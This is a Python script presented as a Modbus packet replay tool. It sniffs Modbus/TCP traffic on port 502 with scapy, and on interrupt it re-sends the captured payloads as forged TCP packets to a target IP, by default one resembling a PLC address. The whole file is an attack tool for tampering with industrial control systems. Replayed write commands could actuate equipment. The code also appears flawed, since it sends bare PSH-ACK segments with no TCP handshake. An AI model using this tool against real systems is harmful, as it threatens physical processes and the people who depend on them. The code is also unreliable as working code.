#!/usr/bin/env python3
"""
Modbus packet replay tool.
Captures Modbus read/write packets and replays them to target.

Usage:
    sudo python modbus_replay.py <target_ip> <port>

Example:
    sudo python modbus_replay.py 192.168.1.100 502
"""

from scapy.all import *
import sys
import time

captured_packets = []
target = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 502


def capture_callback(pkt):
    """Capture Modbus packets for replay."""
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        dport = pkt[TCP].dport
        sport = pkt[TCP].sport

        if dport == 502 or sport == 502:
            captured_packets.append(pkt)
            raw_data = bytes(pkt[Raw].load)
            if len(raw_data) >= 8:
                function_code = raw_data[7]
                print(f"[+] Captured packet: Func={function_code} Len={len(raw_data)}")


def replay_packets():
    """Replay captured packets to target."""
    if not captured_packets:
        print("[-] No packets captured!")
        return

    print(f"\n[*] Replaying {len(captured_packets)} packets to {target}:{port}")

    for idx, original_pkt in enumerate(captured_packets):
        raw_data = bytes(original_pkt[Raw].load)

        pkt = (
            IP(dst=target)
            / TCP(dport=port, sport=random.randint(40000, 60000), flags="PA")
            / Raw(load=raw_data)
        )
        send(pkt, verbose=0)
        print(f"[+] Replayed packet {idx + 1}/{len(captured_packets)}")
        time.sleep(0.5)


if __name__ == "__main__":
    print("[*] Starting Modbus packet capture (Ctrl+C to start replay)...")
    try:
        sniff(filter="tcp port 502", prn=capture_callback, store=0)
    except KeyboardInterrupt:
        print("\n[*] Capture stopped")
        replay_packets()
